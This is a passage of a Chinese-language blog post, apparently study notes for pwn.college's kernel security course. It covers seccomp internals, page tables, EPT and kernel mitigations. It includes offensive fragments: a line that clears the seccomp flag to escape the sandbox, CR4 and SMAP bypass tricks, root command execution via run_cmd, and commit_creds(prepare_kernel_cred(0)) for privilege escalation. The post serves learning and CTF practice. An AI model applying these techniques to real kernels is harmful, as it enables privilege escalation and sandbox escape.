class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">syscall_work_bit</span> &#123;</span><br>SYSCALL_WORK_BIT_SECCOMP, <span class="hljs-comment">//0</span><br>SYSCALL_WORK_BIT_SYSCALL_TRACEPOINT, <span class="hljs-comment">//1</span><br>SYSCALL_WORK_BIT_SYSCALL_TRACE, <span class="hljs-comment">//2</span><br>SYSCALL_WORK_BIT_SYSCALL_EMU, <span class="hljs-comment">//3</span><br>SYSCALL_WORK_BIT_SYSCALL_AUDIT, <span class="hljs-comment">//4</span><br>SYSCALL_WORK_BIT_SYSCALL_USER_DISPATCH, <span class="hljs-comment">//5</span><br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_WORK_SECCOMPBIT(SYSCALL_WORK_BIT_SECCOMP) <span class="hljs-comment">//最右边第一位是seccomp位</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_WORK_SYSCALL_TRACEPOINTBIT(SYSCALL_WORK_BIT_SYSCALL_TRACEPOINT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_WORK_SYSCALL_TRACEBIT(SYSCALL_WORK_BIT_SYSCALL_TRACE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_WORK_SYSCALL_EMUBIT(SYSCALL_WORK_BIT_SYSCALL_EMU)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_WORK_SYSCALL_AUDITBIT(SYSCALL_WORK_BIT_SYSCALL_AUDIT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_WORK_SYSCALL_USER_DISPATCH BIT(SYSCALL_WORK_BIT_SYSCALL_USER_DISPATCH)</span><br></code></pre></td></tr></table></figure><ul><li><code>enum</code>：枚举是 C 语言中的一种基本数据类型，用于定义一组具有离散值的常量。第一个枚举成员的默认值为整型的 0，后续枚举成员的值在前一个成员上加 1。</li><li><code>BIT</code>：在<code>include/vdso/bits.h</code>中定义了该宏</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BIT(nr)(UL(1) &lt;&lt; (nr))</span><br></code></pre></td></tr></table></figure><p>将1转换为无符号长整型(x64&#x2F;32分别为8&#x2F;4字节)，左移<code>nr</code>位</p><p>所以<code>SYSCALL_WORK_SECCOMP</code>是<code>task_struct</code>-&gt;<code>thread_info</code>.<code>syscall_work</code>的右边第一位。</p><p>标志位找到了，接下来研究seccomp启动时该标志位的具体作用。在源码中追踪<code>secure_computing</code>和<code>__secure_computing</code>函数。</p><p><a href="/include/linux/seccomp.h">&#x2F;include&#x2F;linux&#x2F;seccomp.h</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> __secure_computing(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> seccomp_data *sd);<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">secure_computing</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-keyword">if</span> (unlikely(test_syscall_work(SECCOMP)))<br><span class="hljs-keyword">return</span>  __secure_computing(<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="/kernel/seccomp.c">&#x2F;kernel&#x2F;seccomp.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __secure_computing(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> seccomp_data *sd)<br>&#123;<br><span class="hljs-type">int</span> mode = current-&gt;seccomp.mode;<br><span class="hljs-type">int</span> this_syscall;<br><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_CHECKPOINT_RESTORE) &amp;&amp;<br>    unlikely(current-&gt;ptrace &amp; PT_SUSPEND_SECCOMP))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>this_syscall = sd ? sd-&gt;nr :<br>syscall_get_nr(current, current_pt_regs());<br><br><span class="hljs-keyword">switch</span> (mode) &#123;<br><span class="hljs-keyword">case</span> SECCOMP_MODE_STRICT:<br>__secure_computing_strict(this_syscall);  <span class="hljs-comment">/* may call do_exit */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">case</span> SECCOMP_MODE_FILTER:<br><span class="hljs-keyword">return</span> __seccomp_filter(this_syscall, sd, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">default</span>:<br>BUG();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现通过<code>test_syscall_work</code>宏验证<code>SECCOMP</code>位，查看其定义观察验证方式</p><p><a href="https://elixir.bootlin.com/linux/v5.11/source/include/linux/thread_info.h#L139"><code>/include/linux/thread_info.h</code></a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_GENERIC_ENTRY</span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> test_syscall_work(fl) \</span><br><span class="hljs-meta">test_bit(SYSCALL_WORK_BIT_##fl, &amp;current_thread_info()-&gt;syscall_work)</span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> test_syscall_work(fl) \</span><br><span class="hljs-meta">test_ti_thread_flag(current_thread_info(), TIF_##fl)</span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">test_ti_thread_flag</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> thread_info *ti, <span class="hljs-type">int</span> flag)</span><br>&#123;<br><span class="hljs-keyword">return</span> test_bit(flag, (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)&amp;ti-&gt;flags);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，在内核构建的配置选项中如果设置了<code>CONFIG_GENERIC_ENTRY</code>,内核就通过<code>SYSCALL_WORK_BIT_SECCOMP</code>位来验证是否开启seccomp沙箱，否则还是旧版本的通过flags验证。</p><p><code>CONFIG_GENERIC_ENTRY</code>通常用于指示是否启用通用的系统调用入口点，这使得内核可以以一种通用的方式处理系统调用，而不需要为每个系统调用都单独实现入口点。该选项默认开启，并且绝大部分情况下都不会禁用。</p><p>因此，v5.11版本后内核关闭seccomp的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">current-&gt;thread_info.syscall_work &amp;= ~SYSCALL_WORK_SECCOMP;<br><span class="hljs-comment">//SYSCALL_WORK_SECCOMP = 1 &lt;&lt; SYSCALL_WORK_BIT_SECCOMP = 1</span><br><span class="hljs-comment">//SYSCALL_WORK_BIT_SECCOMP = 0</span><br></code></pre></td></tr></table></figure><h3 id="Memory-Management"><a href="#Memory-Management" class="headerlink" title="Memory Management"></a>Memory Management</h3><p><strong>复习：进程内存</strong></p><p>每个Linux进程都有一块虚拟内存空间，其中包含：</p><ul><li>映射后的二进制可执行文件</li><li>动态链接库</li><li>堆（动态申请的内存）</li><li>栈</li><li>任何被程序mmap特别映射的内存</li><li>some helper regions（不理解这是内存的那部分）</li><li>内核空间(在x64中大于0x8000000000000000)</li></ul><p>对进程来说虚拟内存是脆弱的。</p><p>可以通过<code>/proc/self/maps</code>查看当前进程的虚拟内存映射。</p><p>物理内存是计算机中的<code>RAM</code>，被整个系统共享。</p><p>多个进程的虚拟内存有相同的地址，那么如何将多个进程的内存转换到物理内存而不冲突呢？</p><p>解决方案是由操作系统内核负责将维护虚拟内核和物理内存的映射。</p><p><strong>虚拟内存和物理内存之间的映射</strong></p><p>操作系统会以<code>4kb</code>大小的进程虚拟内存为一个整体映射到物理内存的某个地址，如图</p><p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240306192337.png" alt="4"></p><p>以这种方式分配，在虚拟内存中连续的内存块映射到物理内存时可能是不连续的。例如当p2需要更多内存但紧跟其后的内存已经被占据时，p2的下一个内存块就会映射到更高的非连续物理地址，否则需要转移紧跟的内存块，这将造成巨大的性能开支。</p><p>这种方案在内核中的实现称为<code>内核页表</code>。</p><p><strong>内核页表</strong></p><p>历史上，内核页表(<code>Page Table,PT</code>)是从填满了页表项(<code>Page Table Entries,PTD</code>)的一级页表开始的。</p><p>每个页表有512个页表项，一个页表项记录一块<code>4kb(0x1000)</code>大小的内存块的基址，一个4kb内存块就称为一页(<code>page</code>)。因此，一个一级页表最多映射<code>2MB</code>的内存，一个页表的大小在x64&#x2F;32平台上分别为4kb&#x2F;2kb。</p><p>相邻页表项对应相邻的虚拟内存页。如图：</p><p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240306194632.png" alt="5"></p><p>只使用一级页表存在一些不方便解决的问题：</p><ul><li>如何映射非连续的虚拟内存</li><li>如果需要映射的连续虚拟内存大于2MB，甚至远大于2MB怎么办</li></ul><p>解决方案是使用嵌套式的<code>多级页表结构(the multi-level paging struct)</code>,引入二级页表(<code>Page Directory,PD</code>).</p><p>二级页表同样包含512个页表项(<code>Page Directory Entries,PDE</code>)，一个表项记录一个一级页表的物理地址，一个二级页表能够映射<code>2MB * 512 = 1GB</code>的内存</p><p>通过设置一个特殊的flag位，可以使PDE指向一块2MB的物理内存，而不是指向PT</p><p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240306202617.png" alt="6"></p><p>如果物理内存大于1GB，就继续引入三级页表(<code>Page Directory Page Table,PDPT</code>)</p><p>三级页表中也有512个页表项(<code>Page Directory Pointers,PDP</code>)，总共可以映射512G的内存。</p><p>同样的，通过设置特殊的flag位，可以使页表项PDP指向1GB的物理内存，而不是指向PD。</p><p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240306203800.png" alt="7"></p><p>以此类推，我们可以建立四级页表(<code>Page Map Level 4,PML4</code>)，五级页表(<code>Page Map Level 5,PML5</code>)…..,它们可以映射的内存大小是指数增长的(每级x512)。</p><p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240306204054.png" alt="8"></p><p><strong>进程中的虚拟地址与页表中索引间的转换</strong></p><p>进程虚拟地址和物理地址通过页表的索引进行转换。</p><p>注意：可定位的内存地址只有前48比特(0-0x7FFFFFFFFFFF)，0x800000000000之后是内核空间</p><p>以0x7fff47d4c123为例，将其转换为二进制形式</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">0111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">0100 </span><span class="hljs-number">0111 </span><span class="hljs-number">1101 </span><span class="hljs-number">0100 </span><span class="hljs-number">1100 </span><span class="hljs-number">0001 </span><span class="hljs-number">0010 </span><span class="hljs-number">0011</span><br></code></pre></td></tr></table></figure><p>在x64架构下，一个<code>Page</code>占<code>4kb</code>，对应二进制<code>1 0000 0000 0000</code>，每个字节都要占据一个索引位。所以一个页的索引总数是<code>4096</code>,范围是<code>0 - 1111 1111 1111 1111</code>，在虚拟内存地址中占12个二进制位。</p><p>一个页表有512项，8字节一项，一共也是<code>4kb</code>,但是对页表来说每一项需要一个索引而不是1比特对应1索引。因此一个页表的索引总数是<code>512</code>,范围是<code>0-1 1111 1111</code>，在虚拟内存地址中占9个二进制位。</p><p>因此对0x7fff47d4c123的<code>地址-索引</code>划分如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1</span><span class="hljs-comment">//A:Page Map Level 4中的索引</span><br><span class="hljs-number">111</span> <span class="hljs-number">1111</span> <span class="hljs-number">01</span><span class="hljs-comment">//B:Page Directory Page Table中的索引</span><br><span class="hljs-number">00</span> <span class="hljs-number">0111</span> <span class="hljs-number">110</span><span class="hljs-comment">//C:Page Directory中的索引</span><br><span class="hljs-number">1</span> <span class="hljs-number">0100</span> <span class="hljs-number">1100</span><span class="hljs-comment">//D:Page Table中的索引 </span><br><span class="hljs-number">0001</span> <span class="hljs-number">0010</span> <span class="hljs-number">0011</span><span class="hljs-comment">//E:Page中的索引</span><br></code></pre></td></tr></table></figure><p>因此类似<code>mov rax,[rbx]</code>可以转换成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">rax = *(long *)(PML4[A][B][c][D])[E]<br></code></pre></td></tr></table></figure><p><strong>进程隔离 - 进程虚拟内存到物理内存</strong></p><p>每个进程有其独立的PML4，获取了PML4的地址就能根据索引获取该进程映射的所有物理内存地址，那么如何获取PML4的地址呢？</p><p><code>CR3</code>寄存器保存了PML4的物理地址。</p><p>并且在<code>Introduction</code>一节中已经讲过，<code>CR3</code>寄存器只能在ring0权限下通过<code>mov</code>指令访问。</p><p>题外话：</p><p>除了<code>CR3</code>,还有很多Control Registers用来设置处理器选项(比如设置模式为32位还是64位)以及其它很多疯狂的东西。如果感兴趣，可以访问:</p><p><a href="https://wiki.osdev.org/CPU_Registers_x86">https://wiki.osdev.org/CPU_Registers_x86</a></p><p><strong>虚拟机隔离 - 内存虚拟化</strong></p><p>如何隔离多个虚拟机？客户机内核应当如何访问物理内存？</p><p>为了解决虚拟机内存到物理内存的转换以及虚拟机间的隔离等问题，引入了通过<code>硬件辅助虚拟化</code>实现的扩展页表<code>The Extended Page Table,EPT</code>技术。</p><p>一些概念及缩写：</p><ul><li>客户机(虚拟机)，<code>Guest VM</code>或<code>Guest</code></li><li>宿主机物理内存地址，<code>Host Physical Address,HPA</code></li><li>宿主机虚拟内存地址，<code>Host Virtual Address,HVA</code></li><li>客户机物理内存地址，<code>Guest Physical Address,GPA</code></li><li>客户机虚拟内存地址，<code>Guest Virtual Address,GVA</code></li><li>虚拟机管理程序，<code>Virtual Machine Monitor,VMM</code></li><li>虚拟机控制结构，<code>Virtual Machine Control Structure,VMCS</code></li></ul><p><code>EPT</code>是Intel为实现内存虚拟化专门增加的硬件特性。EPT技术的核心概念是在处理器硬件级别上增加了一组额外的页表、对应的内存管理器<code>EPT MMU</code>和对应的缓存<code>EPT TLB</code>，用于将<code>GVA</code>映射到<code>HPA</code>，而不用经过<code>GPA -&gt; HVA -&gt; HPA</code>三个阶段的地址转换。</p><p>整体架构如下图，客户机由<code>VMM</code>管理，<code>VMM</code>或<code>EPT MMU</code>管理<code>EPT</code>实现<code>GPA</code>和<code>HPA</code>的转换从而模拟出所有<code>Guest CPU</code>需要访问的<code>GPA</code>。</p><p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240309102937.png" alt="9"></p><p>具体的转换过程如下。</p><p><code>GPA</code> -&gt; <code>HPA</code></p><p><code>GPA</code>转为<code>HPA</code>的过程和<code>HVA</code>转为<code>HPA</code>的过程十分类似。<code>EPT</code>也包含四级页表，其结构和其它内核页表相同。<code>GPA</code>也由4个索引(Index)和1个<code>Page Offset</code>构成，不同点在于<code>EPT PML4</code>的基址通过<code>VMCS</code>的<code>EPTP</code>字段获取，有了这些信息，就和<code>HVA</code>到<code>HPA</code>的转换一样由一级级页表索引到某个页表中的<code>HPA</code>。<code>EPT</code>页表和<code>VMCS</code>都存放在<code>Host</code>物理内存中。</p><p><code>GVA</code> -&gt; <code>HPA</code></p><p>注意：<code>Guest</code>的内核页表事实上存放在<code>Host</code>物理内存中。</p><ol><li><p>当<code>Guest</code>需要将<code>GVA</code>转换成<code>GPA</code>，先获取<code>GVA</code>中的4个<code>Index</code>和1个<code>Page Offset</code>，通过CR3寄存器寻址PML4基址的<code>GPA</code>。</p></li><li><p>由<code>EPT MMU</code>将PML4基址的<code>GPA</code>转换为PML4基址的<code>HPA</code>，结合<code>Index4</code>获取<code>PDPT</code>基址的<code>GPA</code></p></li><li><p><code>PDPT</code>基址的<code>GPA</code>经过<code>EPT</code>转换为<code>PDPT</code>基址的<code>HPA</code>，结合<code>Index3</code>获取<code>PD</code>基址的<code>GPA</code></p></li><li><p>以此类推，得到<code>GVA</code>对应的<code>HPA</code>，如下图：</p></li></ol><p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240309124009.png" alt="10"></p><p><strong>性能优化 - 页表项缓存TLB和内存管理器MMU</strong></p><p>以上过程涉及到很多转换，如果这些转换都由内核来完成，速度会很慢，因此需要TLB和MMU进行性能优化。TLB(EPT TLB)和MMU(EPT MMU)都是CPU内部的组件，拥有较高的运行性能。</p><ul><li>页表项缓存<code>Translation Lookaside Buffer,TLB</code>，用于存储程序中最常访问的页表项，以加快虚拟地址到物理地址的转换速度。</li><li><code>EPT TLB</code>，针对虚拟化进行优化后的TLB。</li><li>内存管理器<code>Memory Management Unit,MMU</code>，负责将虚拟内存实际翻译成物理内存。</li><li><code>EPT MMU</code>， Intel 处理器架构的一种特性，在硬件层面上提供了增强的虚拟化支持。扩展了 MMU 的功能，允许处理器直接管理虚拟机内部的内存映射，而无需通过 VMM（Virtual Machine Monitor，虚拟机监视器）介入。</li></ul><p><strong>Other Arch</strong></p><p>arm：CR3寄存器被TTBR0(用户空间)和TTBR1(内核空间)取代，各级页表被称为<code>Level0</code>、<code>Level1</code>、<code>Level2</code>、<code>Level3</code>。</p><p>Linux通用术语：</p><p>PML4 &#x3D; PGD(Page Gloval Diretory)</p><p>PDPT &#x3D; PUD(Page Upper Directory)</p><p>PD &#x3D; PMD(Page Mid-Level Directory)</p><p>PT &#x3D; PT(Page Table)</p><p>Linux需要<code>MMU</code>来支持虚拟内存机制，FreeRTOS、VxWorks、ucOS等不需要<code>MMU</code>。</p><h4 id="高版本内核中的五级页表-新增P4D"><a href="#高版本内核中的五级页表-新增P4D" class="headerlink" title="高版本内核中的五级页表(新增P4D)"></a>高版本内核中的五级页表(新增P4D)</h4><p>研究获取子进程虚拟内存的物理地址时发现有的代码中出现了<code>P4D</code>。查阅资料得知较新版本的Linux内核已经支持<code>五级页表</code>，在PGD和PUD之间增加了一个页表，称为P4D。pwncollege的实验环境中是五级页表。</p><p><strong>The Kernel Sees ALL</strong></p><p>The Old Way:</p><p>某些应用程序（Xorg）需要从用户空间直接访问物理内存。 存在特殊文件<code>/dev/mem</code>来提供此访问。 过去，如果攻击者具有root用户访问权限，则可以从该文件查看和更改内核内存。 引入了<code>CONFIG_STRICT_DEVMEM</code>内核选项以阻止对非设备存储器的访问。</p><p>The New Way: </p><p>在版本较新的内核中，想要获取物理内存，就必须从内核访问。</p><p>为了便于访问，映射为内核虚拟内存的物理内存是<strong>连续</strong>的。</p><p><code>phys_to_virt</code> 和 <code>virt_to_phys</code>分别用于将物理地址转换为内核虚拟地址和将内核虚拟地址转换为物理地址。</p><p>其定义如下(内核版本v6.7.9,<a href="/arch/x86/include/asm/io.h">&#x2F;arch&#x2F;x86&#x2F;include&#x2F;asm&#x2F;io.h</a>)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">phys_addr_t</span> <span class="hljs-title function_">virt_to_phys</span><span class="hljs-params">(<span class="hljs-keyword">volatile</span> <span class="hljs-type">void</span> *address)</span><br>&#123;<br><span class="hljs-keyword">return</span> __pa(address);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">phys_to_virt</span><span class="hljs-params">(<span class="hljs-type">phys_addr_t</span> address)</span><br>&#123;<br><span class="hljs-keyword">return</span> __va(address);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __va(x)((void *)((unsigned long)(x)+PAGE_OFFSET))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __pa(x)__phys_addr((unsigned long)(x))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __phys_addr(x)__phys_addr_nodebug(x)</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> __phys_addr_nodebug(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> x)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> y = x - __START_KERNEL_map;<br><br><span class="hljs-comment">/* use the carry flag to determine if x was &lt; __START_KERNEL_map */</span><br>x = y + ((x &gt; y) ? phys_base : (__START_KERNEL_map - PAGE_OFFSET));<br><br><span class="hljs-keyword">return</span> x;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h3><p>在黑客行为中，内核是非常流行和该价值的攻击目标(比如内核漏洞利用是攻击智能手机非常经典的一环)。采取对内核攻击的缓解措施十分重要。</p><p><a href="https://blog.wjhwjhn.com/posts/linux-kernel-%E4%B8%AD%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%92%8C%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/">参考文章</a></p><p><strong>内核态中一些和用户态相似的保护</strong></p><ul><li><code>Stack canary</code>,保护栈。</li><li><code>kASLR</code>,在<code>boot</code>时将内核空间重定位至随机基址。可依据每次启动后<code>/proc/kallsyms</code>中函数符号的地址是否不变判断是否开启<code>kASLR</code>。</li><li><code>NX</code>，堆栈默认不可执行。</li></ul><p>当不开启 <code>kaslr</code> 的时候，道场中默认的内核虚拟机基地址是：<code>0xffffffff81000000</code></p><p>内核的设计哲学:<a href="https://www.kernel.org/doc/Documentation/security/self-protection.txt">https://www.kernel.org/doc/Documentation/security/self-protection.txt</a></p><p>对于上面这些常见的保护已经有了对应的绕过思路：</p><ul><li><code>Stack canary</code>:泄露canary</li><li><code>kASLR</code>:泄露内核符号地址，计算内核基址</li><li>堆栈不可执行：ROP</li></ul><p>于是内核中又引入了KASLR的加强版 - <code>Function Granular KASLR,FGKASLR</code>。在开启了<code>FGASLR</code>的内核中，进行了更复杂的随机化，即使泄露了内核的程序基地址也不能调用任意的内核函数，需要通过琐碎的地址泄露来进行绕过，具体可参考<a href="https://blog.csdn.net/qq_38154820/article/details/131631111">该文章</a>。</p><p><strong>内核态特有的保护措施</strong></p><ul><li><code>Supervisor Mode Execution,SMEP</code></li></ul><p>用户代码不可执行，禁止内核态代码跳转执行用户态代码。</p><p>正常内核默认开启，在qemu的 <code>-cpu</code> 选项中添加 <code>+smep</code> 来开启。</p><ul><li><code>Supervisor Mode Access Protection,SMAP</code></li></ul><p>用户数据不可访问，禁止内核代码读写用户内存数据。</p><p>  正常内核默认开启，在qemu的 <code>-cpu</code> 选项中添加 <code>+smap</code> 来开启 。</p><ul><li><p>通过查看<code>/proc/cpuinfo</code>是否包含smep&#x2F;smap字段判断是否开启该保护</p></li><li><p><code>SMEP</code>&#x2F;<code>SMAP</code>攻击思路</p></li></ul><p>1.通过设置<code>RFLAGS</code>寄存器中的<code>AC</code>位为1可以无视<code>SMAP</code>访问用户态内存，可以通过<code>stac</code>和<code>clac</code>两个R0层指令来管理该位。内核态函数<code>copy_from_user</code>和<code>copy_to_user</code>就是通过设置<code>AC</code>位来访问用户空间的。</p><p>2.通过执行内核中对应的gadget来修改CR4寄存器为0x6f0 (011011110000b)使<code>SMEP</code>和<code>SMAP</code>失效。</p><p><code>cr4</code>寄存器第20位用于标记是否开启<code>SMEP</code>。</p><p><code>cr4</code>寄存器第21位用于标记是否开启<code>SMAP</code>。</p><p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240310165300.png" alt="11"></p><p>3.通过内核态函数<code>run_cmd(char *cmd)</code>可以以root权限执行用户态命令。</p><p>源码：<a href="https://elixir.bootlin.com/linux/latest/ident/run_cmd">https://elixir.bootlin.com/linux/latest/ident/run_cmd</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">run_cmd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd)</span><br>&#123;<br><span class="hljs-type">char</span> **argv;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *envp[] = &#123;<br><span class="hljs-string">&quot;HOME=/&quot;</span>,<br><span class="hljs-string">&quot;PATH=/sbin:/bin:/usr/sbin:/usr/bin&quot;</span>,<br><span class="hljs-literal">NULL</span><br>&#125;;<br><span class="hljs-type">int</span> ret;<br>argv = argv_split(GFP_KERNEL, cmd, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (argv) &#123;<br>ret = call_usermodehelper(argv[<span class="hljs-number">0</span>], argv, envp, UMH_WAIT_EXEC); <br>        <span class="hljs-comment">//UMH_WAIT_EXEC表示等待命令执行完成后再返回</span><br>argv_free(argv);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>ret = -ENOMEM;<br>&#125;<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>kptr_restrict</code></li></ul><p>用来限制用户态读取内核指针的显示。</p><p>为0时, 未作任何处理, 直接输出, 这样对所有用户都没有限制；为1时, 中断上下文则不允许输出, 否则只有root用户才显示实际地址；为 2 时, 将指针直接置NULL, 这样所有用户都只能看到全0。</p><p>同时，在内核态格式化打印时，<code>%p</code>和<code>%pk</code>不输出实际地址而输出散列化地址;<code>%px</code>输出实际地址。</p><p>通过<code>/proc/sys/kernel/kptr_restrict</code>查看和修改该保护</p><ul><li><code>dmesg_restrict</code></li></ul><p>其值为0时，非特权用户对内核日志的查看将不受限制；值为1时，只有具有<code>CAP_SYSLOG</code>特权的用户(包括root用户)才能查看内核日志。</p><p>通过<code>/proc/sys/kernel/dmesg_restrict</code>查看和修改该保护</p><h3 id="Writing-Kernel-Shellcode"><a href="#Writing-Kernel-Shellcode" class="headerlink" title="Writing Kernel Shellcode"></a>Writing Kernel Shellcode</h3><p>系统调用是用户态和内核态的接口。<code>syscall</code>执行后会跳转到内核中的<code>syscall_entry</code>函数，和用户态一样使用<code>syscall</code>编写shellcode的方式在内核空间并不适用(内核线程崩溃,触发<code>segment fault</code>)。</p><p>在内核中，往往使用内核API和内核对象来达成我们的目标。</p><p>权限提升:</p><p><code>commit_creds(prepare_kernel_cred(0));</code></p><p>Seccomp沙箱逃逸:</p><p><code>current-&gt;thread_info.flags &amp;= ~(1 &lt;&lt; 